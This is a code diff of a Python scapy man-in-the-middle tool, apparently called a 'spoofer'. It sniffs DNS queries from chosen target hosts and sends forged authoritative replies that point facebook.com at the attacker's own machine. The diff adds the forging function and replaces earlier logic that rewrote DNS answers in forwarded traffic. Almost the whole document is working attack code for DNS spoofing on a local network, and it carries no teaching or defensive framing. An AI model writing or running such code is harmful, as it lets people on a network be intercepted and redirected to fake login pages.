@@ -1,4 +1,7 @@
 from scapy.all import *
+import logging
+
+logger = logging.getLogger("SPOFFER")
 
 ifname = None
 targets_MAC = None
@@ -8,57 +11,30 @@ targets = None
 target_MAC_mapper = {}
 my_addr = None
 
+def make_reply(pkt,redirect):
+    fake_pkt = IP(dst=pkt[IP].src,
+                    src=pkt[IP].dst)/\
+                    UDP(dport=pkt[UDP].sport,sport=53)/\
+                    DNS(id=pkt[DNS].id,
+                        #qd=pkt[DNS].qd,
+                        aa=1,
+                        qr=1,
+                        ancount=1,
+                        an=DNSRR(rrname=pkt[DNSQR].qname, rdata=redirect))/\
+                    DNSRR(
+                        rrname=pkt[DNSQR].qname,
+                        rdata=redirect)
+    fake_pkt.show()
+    return fake_pkt     
+
 def handle_packet(pkt):
-    try:
 
-        if not pkt.haslayer(IP):
-            return
+    if pkt.haslayer(DNSQR) and pkt.haslayer(IP) and pkt[DNS].opcode == 0 and pkt[IP].src in targets and pkt[0].dst == my_addr:
+        qname = pkt[DNSQR].qname.decode('utf-8')
+        print(qname)
+        if qname == "www.facebook.com." or qname == "www.facebook.com" or qname == "facebook.com." or qname == "facebook.com":
+            send(make_reply(pkt, get_if_addr(ifname)))
 
-        if pkt[0].dst == "ff:ff:ff:ff:ff:ff":
-            return
-
-        if pkt[0].src in targets_MAC:
-            pkt[0].dst = gateway_MAC
-
-        elif pkt[IP].dst in targets:
-            if pkt[IP].dst not in target_MAC_mapper:
-                return
-            pkt[0].dst = target_MAC_mapper[pkt[IP].dst]
-
-        else:
-            return
-
-        print(pkt[IP].ttl)
-        #print("Source before:")
-        #print(pkt[0].src)
-        #print(pkt[IP].src)
-        #print("Dest before:")
-        #print(pkt[0].dst)
-        #print(pkt[IP].dst)
-
-        pkt[0].src = my_addr
-
-        if pkt.haslayer(DNS):
-            qname = pkt[DNS].an.rrname.decode("utf-8")
-            print(qname)
-            if qname == "www.facebook.com." or qname == "www.facebook.com" or qname == "facebook.com." or qname == "facebook.com":
-                pkt[DNS].an.rdata = get_if_addr(ifname)
-                print("dnssssssssssssssssssss")
-                pkt.show()
-                #exit()
-
-        #pkt.show()
-        #print("Source After:")
-        #print(pkt[0].src)
-        #print(pkt[IP].src)
-        #print("Dest After:")
-        #print(pkt[0].dst)
-        #print(pkt[IP].dst)
-        #print("""\n\n\n""")
-        #sendp(pkt, verbose=False)
-    
-    except Exception:
-        return
 
 
 def StartMITM(_targets, _targets_MAC, _gateway_MAC, _ifname):
@@ -81,3 +57,4 @@ def StartMITM(_targets, _targets_MAC, _gateway_MAC, _ifname):
             else:
                 filter_ += "host " + t
     sniff(filter=filter_, prn=handle_packet, iface=ifname)
+    logger.info("EXIT")
